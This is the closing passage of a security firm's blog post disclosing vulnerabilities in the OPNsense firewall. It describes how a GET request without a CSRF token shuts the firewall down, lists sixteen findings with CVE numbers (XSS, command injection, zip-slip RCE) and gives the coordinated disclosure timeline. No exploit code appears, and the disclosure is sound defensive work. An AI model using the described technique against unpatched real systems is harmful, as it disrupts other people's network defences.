Normally, this request is made using POST method and requires CSRF token, but during the test it turned out that the app accepts GET request as well, and in such case doesn’t require CSRF token.</p>

<p>As a result, the OPNsense instance turns off.</p>

<h3 id="proof-of-concept-video-1">Proof of Concept Video:</h3>

<iframe width="640" height="360" class="google-video" src="https://drive.google.com/file/d/1GO7aU2QIn4iRpSViC4eE0L7HYchbZ1L6/preview" allowfullscreen="true" allow="autoplay"></iframe>

<h1 id="closing-thoughts">Closing thoughts</h1>

<p>We reported found vulnerabilities to OPNsense maintainers and we really want to thank them for a great response. They handled the whole process very professionally, quickly prepared effective patches for many vulnerabilities and included them in the newest releases - <a href="https://opnsense.org/opnsense-23-7-released/">OPNsense 23.7 “Restless Roadrunner”</a> as well as <a href="https://docs.opnsense.org/releases/BE_23.4.html#august-04-2023">business edition 23.4.2</a>. Also, they provided us with reasoning behind decision not to patch some of them right now.</p>

<p>We are very happy about the outcome of the tests and can’t wait to start another project like this soon. Stay tuned!</p>

<h2 id="full-list-of-found-vulnerabilities">Full list of found vulnerabilities</h2>
<ol>
  <li>LT-0001:  Using GET method to modify application state <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38999">CVE-2023-38999</a></li>
  <li>LT-0002:  Reflected Cross-Site Scripting - Certificates - act <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39002">CVE-2023-39002</a></li>
  <li>LT-0003:  Insecure directory permissions - /conf/ <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39004">CVE-2023-39004</a></li>
  <li>LT-0004:  Reflected Cross-Site Scripting - Log Files - /ui/diagnostics/log/core/ <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39000">CVE-2023-39000</a></li>
  <li>LT-0005:  Open Redirect - Login <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38998">CVE-2023-38998</a></li>
  <li>LT-0006:  Services run as root</li>
  <li>LT-0007:  Insecure temporary file storage - /tmp/ usage <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39003">CVE-2023-39003</a></li>
  <li>LT-0008:  Command injection - Backups - diag_backup.php <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39001">CVE-2023-39001</a></li>
  <li>LT-0009:  Custom message injection - system_usermanager.php</li>
  <li>LT-0010:  Improper error handling</li>
  <li>LT-0011:  Lack of input sanitization - crash_reporter.php <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39006">CVE-2023-39006</a></li>
  <li>LT-0013:  Insecure permissions - configd.socket <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39005">CVE-2023-39005</a></li>
  <li>LT-0014:  Zip-slip in Captive Portal template upload leads to Remote Code Execution <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38997">CVE-2023-38997</a></li>
  <li>LT-0015:  Verbose error messages</li>
  <li>LT-0016:  Command injection - Cron - /api/cron/settings/setJob/ <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39008">CVE-2023-39008</a></li>
  <li>LT-0017:  Reflected Cross-Site Scripting - Cron - /ui/cron/item/open/ <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39007">CVE-2023-39007</a></li>
</ol>

<h2 id="timeline">Timeline</h2>
<ul>
  <li>27.06.2023 Vulnerabilities reported to OPNsense</li>
  <li>27.06.2023 Report acknowledged</li>
  <li>28.06 - 05.07.2023 Vendor fixed the vulnerabilities</li>
  <li>12.07 Retest</li>
  <li>17.07.2023 End of vulnerabilities disclosure process - reported issues are fixed or otherwise handled</li>
  <li>31.07.2023 OPNsense 23.7 Released</li>
</ul>


					  </div>

					  <div class="date">
						Written on August  9, 2023 by
						
						 Feliks Penconek
						
					  </div>
					</article>
				</div>
			</section>
        
        
                    <section class="contact contact--padding" id="contact">
            <div class="container">
                <div class="row">
                    <div class="col-xs-12 align-center">
                        <h2 class="contact__heading-2">We invite you to contact us</h2>
                        <p class="contact__paragraph">through the following form:</p>
                    </div>
                </div>
                <div class="row contact__row-margin-top">
                    <div class="col-xs-12">
                        <form action="index.html#" method="post" class="form">
                            <div class="row">
                                <div class="col-sm-4">
                                    <div class="form-group">
                                        <input id="contact_name" type="text" name="form_name" placeholder="Name and surname / company*" class="form-control form-control--custom" required>
                                    </div>
                                </div>
                                <div class="col-sm-4">
                                    <div class="form-group">
                                        <input id="contact_email" type="email" name="form_email" placeholder="E-mail*" class="form-control form-control--custom" required>
                                    </div>
                                </div>
                                <div class="col-sm-4">
                                    <div class="form-group">
                                        <input id="contact_tel" type="text" name="form_phone" placeholder="Telephone (optional)" class="form-control form-control--custom">
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-sm-12">
                                    <div class="form-group">
                                        <textarea id="contact_msg" name="form_message" placeholder="Message*" rows="6" class="form-control form-control--custom textarea--custom" required></textarea>
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-sm-8 col-md-10">
                                    <div class="checkbox checkbox-gdpr">
                                        <p class="contact__paragraph">
                                            <label>
                                                <input type="checkbox" id="gdpr_terms" name="gdpr_terms" required><strong>I agree to the processing of my personal data and sending the offer.</strong><br><a href="#" data-toggle="modal" data-target="#rodo_modal">Rules for the processing of personal data.</a>
                                            </label>
                                        </p>
                                    </div>
                                </div>
                                <div class="col-sm-4 col-md-2">
                                    <button type="submit" class="btn btn--form btn--wide btn--absolute">send</button>
                                </div>
                            </div>
                            <input type="hidden" name="form_submit" >
                        </form>
                      <p id="contactform_status" class="contact__paragraph"><span></span></p> 
                    </div>
                </div>
                <div class="row row-margin-top">
                    <div class="col-xs-6 col-xs--align-center col-sm-4 col-md-2 col-lg-2">
                        <p class="contact__paragraph">LogicalTrust sp. z o.o.<br>sp. k.</p>
                    </div>
                    <div class="col-xs-6 col-xs--align-center col-sm-4 col-md-2 col-lg-3">
                        <p class="contact__paragraph">Stanisławowska 47<br>54-611 Wrocław, Poland, EU</p>
                    </div>
                    <div class="col-xs-6 col-xs--align-center col-xs--margin-top col-sm-4 col-md-2 col-lg-2">
                        <p class="contact__paragraph">NIP: 8952177980<br>KRS: 0000713515</p>
                    </div>
                    <div class="col-xs-6 col-xs--align-center col-xs--margin-top col-sm-4 col-sm--margin-top col-md-2 col-lg-2">
                        <p class="contact__paragraph"><strong>T.: <a href="tel:+48797772743">+48 797 772 743</a><br></strong></p>
                    </div>
                    <div class="col-xs-12 col-xs--align-center col-xs--margin-top col-sm-4 col-sm--margin-top col-md-3 col-lg-3">
                        <p class="contact__paragraph"><strong><a href="mailto:office@logicaltrust.net">office@logicaltrust.net</a></strong><br>Key: &nbsp; <a href="/logicaltrust.gpg">PGP/GPG</a></p>
                    </div>
                </div>
            </div>
        </section>

        
                <footer class="footer footer--padding">
            <div class="container">
                <div class="row">
                    <div class="col-xs-6 col-xs-offset-3 col-xs--align-center col-sm-3 col-sm-offset-0 col-md-3 col-lg-2 footer__image">
                        <img loading="lazy" src="/images/logo.svg" width="169" height="30" alt="LogicalTrust">
                    </div>
                    <div class="col-md-3 col-lg-4 footer__paragraph__xxx">
                        <span class="footer__paragraph">copyright &copy; 2007 - 2024 LogicalTrust</span>
                    </div>
                    <div class="col-md-5 col-lg-6 footer__paragraph__fundations_div">
                        
                        <span class="footer__paragraph__fundations">We support: </span>
                        
                        <img loading="lazy" src="/images/foundationlogo-lasnazawsze_a.png" width="178" height="32" alt="las na zawsze - logo" class="footer__image_fundation2">
                        <img loading="lazy" src="/images/foundationlogo-unicef_a.png" width="71" height="32" alt="unicef - logo" class="footer__image_fundation1">
                    </div>
                </div>
            </div>
        </footer>

    </div>
    <script src="/js/jquery.min.js" ></script>
    <script src="/js/bootstrap.min.js" ></script>
    <script src="/js/ie10.js" ></script>
	<script src="/js/config.js" ></script>
    	<script >
		var _mfq = _mfq || [];
		(function() {
		    var mf = document.createElement("script");
		    mf.type = "text/javascript"; mf.async = true;
		    mf.src = "//cdn.mouseflow.com/projects/994f4beb-fac1-4229-aa91-55dd26ee7aea.js";
		    document.getElementsByTagName("head")[0].appendChild(mf);
		})();
	</script>

    
        <div class="modal fade" id="rodo_modal" tabindex="-1" role="dialog">
      <div class="modal-dialog modal-lg" role="document">
        <div class="modal-content">
          <div class="modal-header"  style="padding: 25px;">
            <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
            <p></p>
            <p></p>
            <h2 class="modal-title" id="myModalLabel">Rules for the processing of personal data.</h2>
          </div>
          <div class="modal-body" style="padding: 25px;">
            <!-- <h1 class="header__heading-1"></h1> -->
            <p class="header__paragraph">
                According to art. 13 of the General Regulation on the Protection of Personal Data of 27 April 2016 (Official Journal EU L 119 of 04.05.2016) I inform that:
            </p>
            <ul class="list-unstyled header__paragraph gdpr_list">
              <li><b>Data Administrator:</b> The administrator of your personal data is Logicaltrust sp. z o.o. sp. k., with its registered office at ul. Stanisławowska 47, 54-611 Wrocław, Tax Identification Number (NIP): 8952177980, National Business Registry Number (REGON): 369271084, National Court Register Number (KRS): 0000713515.</li>
              <li><b>Contact with the Data Administrator:</b> You can contact the data administrator via email at: ado@logicaltrust.net or by traditional mail by sending a letter to the administrator's registered office address.</li>
              <li><b>Purpose and Legal Basis for Processing Personal Data:</b> Your personal data will be processed by the data administrator for the purpose of responding to your inquiries, executing requested contact, taking actions prior to entering into a contract, performing the contract, establishing business relationships, presenting offers upon potential client's request (based on Art. 6(1)(a), (b), and (f) of the General Data Protection Regulation).</li>
              <li><b>Data Processing Period:</b> Your personal data will be processed for the time necessary to clarify your matter and provide a comprehensive response. They will also be processed for the duration of cooperation and the contract (in this case, the data is processed as client data). In the event of non-cooperation, the data will be promptly deleted unless there is a need for further retention for the purpose of defense and protection against claims. In cases where the processing of personal data is based on voluntarily given consent according to Art. 6(1)(a) of the General Data Protection Regulation, you have the right to withdraw your consent at any time. The withdrawal of consent does not affect the lawfulness of processing based on consent before its withdrawal, in accordance with the applicable law.</li>
              <li><b>Scope of Processed Data:</b> The scope of processed data includes: first name, last name, email, and phone number.</li>
              <li><b>Recipients of Personal Data:</b> In specific situations, your personal data may be disclosed, for example, to fulfill a legal obligation or to exercise legally justified interests pursued by the data administrator or by a third party. The categories of recipients to whom the data administrator may disclose your personal data are entities or authorities authorized by law and service providers processing personal data on behalf of the data administrator based on data processing agreements (e.g., hosting company).</li>
              <li><b>Data Transfers:</b> Your personal data will not be transferred outside the European Economic Area.</li>
              <li><b>Rights and Entitlements:</b> You have the right to request access to your personal data, their correction, deletion, or processing limitations, as well as the right to object to data processing. You also have the right to file a complaint with the President of the Personal Data Protection Office (ul. Stawki 2, 00-193 Warsaw) if you believe that the processing of personal data violates data protection regulations.</li>
              <li><b>Additional Information:</b> Providing data is voluntary, but failure to provide data necessary for correspondence may hinder the execution and maintenance of contact.</li>
            </ul>
          </div>
        </div>
      </div>
    </div>

        <div class="modal fade" id="cookie_modal" tabindex="-1" role="dialog">
  <div class="modal-dialog modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header"  style="padding: 25px;">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <p></p>
        <p></p>
        <h2 class="modal-title" id="myModalLabel2">Cookie policy</h2>
      </div>
      <div class="modal-body" style="padding: 25px;">
        <ul class="list-unstyled header__paragraph gdpr_list">
            <li>1. <b>About cookies</b> - Cookies are small data files, especially text files, which are stored by a server on your computer. With these files, your device will be recognized and, in consequence, the way a given website is presented will be adjusted to your personal preferences. Cookies usually contain the name of the website from which they originate, information on how long they have been stored on the device and a unique number.</li>
            <li>2. <b>Which type of cookies do we use</b> - Session cookies – temporary files which are stored on your device until you log out from a given website or close the Internet browser. Persistent cookies – permanent files that remain on your device for a fixed period (specified in the parameters of the file) or until they are deleted manually. Third-party cookies – files that adjust the way a given website is presented to your personal preferences.</li>
            <li>3. <b>Why do we use cookies?</b> - Cookies are used for the purpose of statistics, marketing and in order to adjust the contents of websites to the user's personal preferences. Cookies store information about geolocation, the visitor's language and random data about session identifiers. With the collected data, we are able to understand how exactly the visitor uses websites and, consequently, to improve their structure and content. The information received helps us to prepare statistics related to the number of new and regular users as well as enables us to analyze which pages are visited.</li>
            <li>4. <b>How to use and how to disable cookies</b> - You can change the settings of your Internet browser at any time, so that it would block cookies or inform you when they are being sent. However, please note that if you do not accept the cookie policy, you may encounter some problems while using the website. The software used for searching websites accepts the cookies by default. The settings of an Internet browser can be changed, so that it would block cookies or inform the user each time when cookies are being sent onto his/her device. For more information on how to disable automatic saving of cookies, please check the settings of your Internet browser (the software used for searching Internet websites).</li>
        </ul>
      </div>
    </div>
  </div>
</div>

    
    <div id="cookie-consent" class="row" style="display: none;">
        <div id="cookie-warn" class="alert alert-dismissible" role="alert">
        
            This page uses cookies. <a href="#" data-toggle="modal" data-target="#cookie_modal"><u>Click here</u></a> to learn more. <a id="accept-cookie" href="#" class="btn btn-success" data-dismiss="alert" aria-label="Accept">Accept</a> <a id="reject-cookie" href="#" class="btn btn-default" data-dismiss="alert" aria-label="Reject">Reject</a>
        
        </div>
    </div>
</body>
</html>
